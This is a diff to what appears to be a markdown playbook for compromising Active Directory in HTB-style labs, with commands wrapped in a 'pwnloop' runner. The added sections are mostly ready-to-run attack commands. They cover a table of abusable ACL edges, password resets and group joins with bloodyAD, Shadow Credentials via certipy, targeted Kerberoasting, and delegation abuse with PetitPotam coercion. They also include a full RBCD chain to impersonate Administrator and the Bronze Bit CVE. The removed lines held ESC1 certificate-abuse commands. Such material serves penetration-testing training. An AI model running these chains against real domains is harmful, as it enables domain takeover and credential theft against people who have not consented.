@@ -102,17 +102,69 @@ Prefer NTLM/password auth here. Kerberos adds `KRB_AP_ERR_SKEW` (DC clock drift)
 and when it is unavoidable the fix is a `faketime` shim on that one command — not
 `ntpdate -u`, which cannot step the container's clock. See above.
 
-Common ACL abuses:
-- `ForceChangePassword` on a user → reset their password with `net rpc password`
-- `GenericAll` on a user → targeted Kerberoast (add an SPN) or password reset
-- `GenericAll`/`GenericWrite` on a computer → resource-based constrained
-  delegation, then impersonate an admin
-- `AddMember` on a group → add yourself, inherit its rights
-- `WriteDacl` on the domain → grant yourself DCSync
+Every abusable edge, what it grants, and the fastest tool to fire it. `bloodyAD`
+is usually the least-friction way from Linux — it re-auths per command (beats the
+token-freeze and the lab reset job):
+
+| Edge (on target) | Grants | Fire it |
+|------------------|--------|---------|
+| `ForceChangePassword` on user | reset their password | `bloodyAD ... set password <user> 'New1!'` / `net rpc password` |
+| `GenericAll`/`GenericWrite` on user | reset pw, add SPN (roast), or shadow creds | `bloodyAD ... set password` or `add uac`/`AddKeyCredentialLink` |
+| `GenericAll`/`GenericWrite`/`WriteDacl` on **computer** | RBCD → impersonate admin on it | set `msDS-AllowedToActOnBehalfOfOtherIdentity` (below) |
+| `AddKeyCredentialLink` on user/computer | **Shadow Credentials** → their NT hash, no reset | `certipy shadow auto` / `pywhisker` |
+| `WriteSPN` / `GenericWrite` on user | **targeted Kerberoast** (add SPN, roast, remove) | `targetedKerberoast.py` |
+| `AddMember`/`AddSelf` on group | join it, inherit its rights | `bloodyAD ... add groupMember <grp> <you>` |
+| `WriteDacl`/`Owner` on object | grant yourself any of the above | `dacledit` / `bloodyAD set owner` then add ACE |
+| `WriteDacl`/`GenericAll` on **domain** | grant yourself DCSync | `dacledit -rights DCSync` |
+| `WriteAccountRestrictions` | write RBCD attr on the object | as computer edge above |
 
 ```bash
 pwnloop x "net rpc password 'target-user' 'NewPass123!' -U 'machine.htb'/'you'%'yourpass' -S $T"
+pwnloop x "bloodyAD --host $T -d <dom> -u <u> -p <p> set password <target> 'New1!'"
+pwnloop x "bloodyAD --host $T -d <dom> -u <u> -p <p> add groupMember '<group>' <u>"
 ```
+
+**Shadow Credentials** — when you hold `AddKeyCredentialLink` (or GenericWrite/
+All) over a principal, add a key credential and PKINIT as them for their NT hash.
+No password reset, so it is quiet and reversible:
+```bash
+pwnloop x "certipy shadow auto -u <u>@<dom> -p <p> -account <target>"   # → NT hash + cleanup
+```
+
+**Targeted Kerberoast** — with write over a user with no SPN, temporarily add
+one, roast, remove it:
+```bash
+pwnloop x "python3 targetedKerberoast.py -v -d <dom> -u <u> -p <p> --request-user <target>"
+```
+
+## Kerberos delegation
+
+```bash
+pwnloop x "impacket-findDelegation <dom>/<u>:<p> -dc-ip $T"   # enumerate all three types
+```
+
+- **Unconstrained** (`TRUSTED_FOR_DELEGATION`): a host holding this caches the
+  TGT of anyone who authenticates to it. Own such a host → coerce a DC to it
+  (`printerbug`/`PetitPotam`, see `references/relay.md`) → capture the DC's TGT →
+  DCSync. `rubeus monitor` / `krbrelayx.py` on the captured host.
+- **Constrained** (`msDS-AllowedToDelegateTo` set): the account can impersonate
+  users to the listed SPNs. `getST -spn <spn> -impersonate Administrator`. With
+  protocol transition (`TrustedToAuthForDelegation`) it works for any user; the
+  returned TGS is forwardable. Alt-service trick: the SPN class isn't enforced,
+  so `cifs/`, `host/`, `http/` on the same host are interchangeable.
+- **RBCD** (`msDS-AllowedToActOnBehalfOfOtherIdentity` on the *target*): the
+  highest-yield write primitive on labs. Any `GenericWrite` over a computer lets
+  you set it. Create/own a computer with an SPN (needs `MachineAccountQuota>0`),
+  point the target's RBCD at it, then full S4U:
+  ```bash
+  pwnloop x "nxc ldap $T -u <u> -p <p> -M maq"                          # MachineAccountQuota
+  pwnloop x "impacket-addcomputer <dom>/<u>:<p> -computer-name PWN\$ -computer-pass P4ss -dc-ip $T"
+  pwnloop x "bloodyAD --host $T -d <dom> -u <u> -p <p> add rbcd <target>\$ PWN\$"
+  pwnloop x "impacket-getST -spn cifs/<target-fqdn> -impersonate Administrator -dc-ip $T '<dom>/PWN\$:P4ss'"
+  pwnloop x "KRB5CCNAME=Administrator@cifs_<target-fqdn>@<DOM>.ccache impacket-wmiexec -k -no-pass <target-fqdn>"
+  ```
+  Bronze Bit (CVE-2020-17049, `getST -force-forwardable`) revives the S4U2Proxy
+  step when the DC would otherwise reject a non-forwardable ticket.
 
 ## DCSync and the domain
 
@@ -124,48 +176,17 @@ pwnloop x "evil-winrm -i $T -u Administrator -H <nthash>"
 
 ## Certificate services (ADCS)
 
-Vulnerable templates are a frequent modern path:
-```bash
-pwnloop x "certipy find -u user@machine.htb -p pass -dc-ip $T -vulnerable -stdout"
-pwnloop x "certipy req -u user@machine.htb -p pass -ca CA-NAME -template VulnTemplate -upn administrator@machine.htb"
-pwnloop x "certipy auth -pfx administrator.pfx -dc-ip $T"
-```
-ESC1 (enrollee-supplied subject) and ESC8 (NTLM relay to the web enrollment
-endpoint) are the ones most often planted in labs.
+A CA in the domain is a frequent modern path and the full ESC1–ESC16 catalog,
+certificate theft and persistence live in **`references/adcs.md`**. Two triggers
+to check on every AD box:
 
-**The signal that AD CS is worth checking** is `BUILTIN\Certificate Service
-DCOM Access` appearing in a user's `whoami /all` output. Read the group list of
-every Windows account you land as.
+- `certipy find -u <u>@<dom> -p <p> -dc-ip $T -stdout -vulnerable` the moment you
+  hold any domain credential.
+- `BUILTIN\Certificate Service DCOM Access` in a user's `whoami /all` — a
+  deliberate signpost that a cert path (or a local DCOM relay) is intended.
 
-**ESC1 is four settings that must all be true** — confirm them in the
-`certipy find` output rather than trusting the `[!] ESC1` tag: `Enrollee
-Supplies Subject : True`, an EKU containing `Client Authentication`,
-`Requires Manager Approval : False`, and enrolment rights held by a group you
-are in (`Domain Users` is the give-away).
-
-**`certipy auth` is PKINIT, so it is Kerberos, so clock skew kills it.**
-`KRB_AP_ERR_SKEW` here is not a broken exploit. The container cannot step its
-own clock (no `CAP_SYS_TIME` — the clock is the host kernel's), so `ntpdate -u`
-fails with `step_systime: Operation not permitted`. Measure, then shim one
-process:
-
-```bash
-pwnloop x "ntpdate -q $T"                     # read the offset, e.g. +28794 s
-pwnloop x "faketime \"\$(date -u -d '+7 hours 59 minutes 55 seconds' '+%F %T')\" \
-  certipy-ad auth -pfx administrator.pfx -dc-ip $T"
-```
-
-That returns a TGT and the account's NT hash; pass it to `evil-winrm -H` or
-`netexec -H`. The certificate remains valid for its full lifetime regardless of
-password resets, so **revoke it during cleanup** — request ID alone is not
-accepted, `certutil -revoke` wants the serial:
-
-```powershell
-certutil -view -restrict "RequestId=<id>" -out "SerialNumber"
-certutil -revoke <serial> 4                     # 4 = superseded
-certutil -view -restrict "RequestId=<id>" -out "RequestId,Request.Disposition"
-# verify: Request Disposition: 0x15 (21) -- Revoked
-```
+`certipy auth` is PKINIT (Kerberos), so clock skew kills it — measure and
+`faketime`-shim as in the Kerberos section above; never `ntpdate -u`.
 
 ## Local Kerberos relay → RBCD (code exec on a hardened DC, no SeImpersonate)
 
